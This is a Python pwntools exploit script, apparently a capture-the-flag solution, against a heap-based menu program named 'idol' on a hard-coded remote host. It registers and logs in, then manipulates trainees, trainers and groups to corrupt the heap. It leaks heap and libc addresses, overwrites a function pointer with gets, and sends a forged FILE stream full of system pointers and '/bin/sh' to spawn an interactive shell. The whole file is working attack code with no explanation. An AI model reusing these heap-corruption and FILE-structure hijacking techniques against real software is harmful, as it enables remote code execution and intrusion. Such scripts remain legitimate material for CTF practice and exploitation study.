from pwn import *

#r = process("./idol")
r = remote("45.32.110.156", 31337)

def register(ID, PW):
	r.send("3\n")
	print r.recvuntil("): ")
	r.send(ID)
	print r.recvuntil("): ")
	r.send(PW)
	print r.recvuntil("name: ")
	r.send("mathboy7\n")
	print r.recvuntil("> ")

def login(ID, PW):
	r.send("1\n")
	print r.recvuntil("ID: ")
	r.send(ID)
	print r.recvuntil("PW: ")
	r.send(PW)
	print r.recvuntil("> ")

def recruitTrainee(name):
	r.send("1\n")
	print r.recvuntil("> ")
	r.send("1\n")
	sleep(3)
	print r.recvuntil("> ")
	r.send("1\n")
	print r.recvuntil("name? ")
	r.send(name)
	print r.recvuntil("> ")
	r.send("6\n")
	print r.recvuntil("> ")

def createGroup(groupNum, groupName, index):
	r.send("2\n")
	sleep(0.1)
	print r.recvuntil("> ")
	r.send("1\n")
	sleep(0.1)
	print r.recvuntil("max:12) ")
	r.send(str(groupNum) + "\n")

	sleep(0.1)

	for i in range(0, groupNum):
		print r.recvuntil(": ")
		r.send(str(index) + "\n")
		sleep(0.1)
	
	print r.recvuntil("name? ")
	sleep(0.1)
	r.send(groupName)
	print r.recvuntil("> ")
	r.send("5\n")
	print r.recvuntil("> ")

def removeMember(groupIndex, memIndex):
	r.send("2\n")
	print r.recvuntil("> ")
	r.send("4\n")
	print r.recvuntil("manage: ")
	r.send(str(groupIndex)+"\n")
	print r.recvuntil("> ")
	r.send("4\n")
	print r.recvuntil("remove: ")
	r.send(str(memIndex) + "\n")
	print r.recvuntil("> ")
	r.send("7\n")
	print r.recvuntil("> ")
	r.send("5\n")
	print r.recvuntil("> ")

def fireTrainee(memIndex):
	r.send("1\n")
	print r.recvuntil("> ")
	r.send("2\n")
	print r.recvuntil("fire: ")
	r.send(str(memIndex) + "\n")
	print r.recvuntil("> ")
	r.send("6\n")
	print r.recvuntil("> ")

def recruitTrainer(name):
	r.send("3\n")
	print r.recvuntil("> ")
	r.send("1\n")
	print r.recvuntil("> ")
	r.send("1\n")
	print r.recvuntil("name? ")
	r.send(name)
	print r.recvuntil("> ")
	r.send("5\n")
	print r.recvuntil("> ")

def delTrainer(index):
	r.send("3\n")
	print r.recvuntil("> ")
	r.send("3\n")
	print r.recvuntil("> ")
	r.send("1\n")
	print r.recvuntil("fire: ")
	r.send(str(index) + "\n")
	print r.recvuntil("> ")
	r.send("5\n")
	print r.recvuntil("> ")

print r.recvuntil("> ")

r.send("3\n")
r.send("a\n")
print r.recvuntil(": ")
r.send("a\n")
print r.recvuntil("> ")

register("aaaa\n", "bbbb\n")
login("aaaa\n", "bbbb\n")

r.send("4\n") # game start
print r.recvuntil("> ")

recruitTrainer("DDDD")
recruitTrainer("EEEE")

recruitTrainee("BBBB")
recruitTrainee("CCCC")
recruitTrainee("A"*24)

recruitTrainee("aaaa")
recruitTrainee("bbbb")
recruitTrainee("C"*24)

recruitTrainee("1111")
recruitTrainee("2222")
recruitTrainee("3333")

createGroup(3, "sexmaster", 1)
sleep(0.5)
createGroup(3, "kkkk", 1)
sleep(0.5)
createGroup(3, "member", 1)

removeMember(2, 1)
removeMember(2, 1)
fireTrainee(1)
fireTrainee(1)

sleep(1)

removeMember(1, 1)
removeMember(1, 1)
removeMember(1, 1)
fireTrainee(1)
fireTrainee(1)
fireTrainee(1)

removeMember(1, 1)

r.send("1\n")
print r.recvuntil("> ")
r.send("3\n") # list trainee
print r.recvuntil("#\n")
r.recv(16)

recved = r.recv(8)

heap_addr = u64(recved)
heap_base = heap_addr - 0x150
point_addr = heap_addr + 0x2a0

print r.recvuntil("> ")
print "\nheap_addr: " + hex(heap_addr)

r.send("6\n")

delTrainer(1)

payload = p64(0x606fe0)
payload += p32(0x10)
payload += p32(10)
payload += p32(0)
payload += p32(0)
payload += p64(point_addr)
payload += p64(heap_base+0x260)*2

#recruitTrainer("A"*32)
recruitTrainer(payload)

r.send("1\n")
print r.recvuntil("> ")
r.send("3\n")
print r.recvuntil("#\n")

recved = r.recv(6)
atoi_libc = u64(recved + "\x00\x00")
libc_base = atoi_libc - 0x36e80
system = libc_base + 0x45390
gets = libc_base + 0x6ed80
stdout = libc_base + 0x3c56f8

print r.recvuntil("> ")
print "atoi@libc: " + hex(atoi_libc)
raw_input("$")
r.send("6\n")
print r.recvuntil("> ")

removeMember(3, 1)
removeMember(3, 1)
removeMember(3, 1)

raw_input("$")
createGroup(3, p64(gets), 2)
raw_input("#")

delTrainer(2)

payload = p64(heap_base + 0x1e0)
payload += p32(0x18)
payload += p32(0x13)
payload += p32(0)
payload += p32(6)
payload += p64(heap_base + 0x5c0)
payload += p64(heap_base + 0x260)
payload += p64(heap_base + 0x260)

recruitTrainer(payload)

fireTrainee(1)

payload = p64(stdout)
payload += p64(6)
payload += p64(heap_base + 0x480)
payload += p32(0x0)
payload += p32(0x3)
payload += p64(0x0)
payload += p64(heap_base + 0x600)
payload += p64(heap_base + 0x6c0)

recruitTrainer(payload)

r.send("2\n")
print r.recvuntil("> ")
r.send("4\n")
print r.recvuntil("manage: ")
r.send("4\n")
print r.recvuntil("> ")
r.send("5\n")
print r.recvuntil("name? ")

r.send(p64(heap_base + 0xc0 - 0x38)[0:6])

#file_stream = "A"*8
file_stream = "\x87\x20\xad\xfb\x3b\x73\x68\x00"
file_stream += p64(libc_base + 0x3c56a3)*7
file_stream += p64(libc_base + 0x3c56a4)
file_stream += "\x00"*32
file_stream += p64(libc_base + 0x3c48e0)
file_stream += p64(0x1)
file_stream += p64(0xffffffffffffffff)
file_stream += p64(0x0)
file_stream += p64(libc_base + 0x3c6780)
file_stream += p64(0xffffffffffffffff)
file_stream += "\x00"*8
file_stream += p64(libc_base + 0x3c47a0)
file_stream += "\x00"*24
file_stream += p64(0xffffffff)
file_stream += "\x00"*16
file_stream += p64(libc_base + 0x3c5700)
file_stream += p64(libc_base + 0x3c5540)
file_stream += p64(libc_base + 0x3c5620)
file_stream += p64(libc_base + 0x3c48e0)
file_stream += p64(libc_base + 0x20b70)
file_stream += p64(system)*15

sleep(0.3)
r.send(file_stream + "\n")
r.interactive()
